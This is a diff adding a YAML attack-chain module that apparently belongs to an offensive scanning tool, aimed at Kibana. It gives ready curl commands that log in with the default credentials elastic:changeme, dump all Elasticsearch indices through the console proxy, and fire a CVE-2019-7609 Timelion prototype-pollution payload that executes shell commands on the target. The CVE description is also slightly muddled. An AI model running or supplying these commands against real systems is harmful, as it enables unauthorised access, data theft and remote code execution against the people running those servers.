@@ -1,0 +1,38 @@
+chain_id: kibana_default_creds
+title: "Kibana — elastic:changeme default and console RCE"
+severity: HIGH
+tags: [web, kibana, elastic, default-creds, rce]
+
+trigger:
+  any_of:
+    - { banner_pattern: "(?i)kibana" }
+    - { path_pattern: "(?i)/kibana/" }
+    - { port: 5601 }
+
+description: |
+  Kibana defaults to `elastic:changeme`. Once authenticated, the
+  Dev Tools console runs arbitrary Elasticsearch queries with the
+  authenticated user's permissions — frequently the `superuser` role
+  on internal deployments. CVE-2018-17246 / CVE-2019-7609 timber-LFI
+  for older versions.
+
+steps:
+  - id: 1
+    title: "Default-cred probe"
+    command: |
+      curl -u elastic:changeme http://$VICTIMA:5601/api/status
+
+  - id: 2
+    title: "Pull every index via the embedded ES proxy"
+    command: |
+      curl -u elastic:changeme http://$VICTIMA:5601/api/console/proxy?path=_cat/indices^&method=GET
+
+  - id: 3
+    title: "Older versions (CVE-2019-7609) — timelion expression RCE"
+    command: |
+      curl -X POST 'http://$VICTIMA:5601/api/timelion/run' \
+        -H 'kbn-xsrf: kibana' -H 'Content-Type: application/json' \
+        --data-binary '{"sheet":[".es(*).props(label.__proto__.env.AAAA=\"require(\\\"child_process\\\").execSync(\\\"id\\\")\")"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"auto","timezone":"UTC"}}'
+
+references:
+  - https://www.elastic.co/community/security
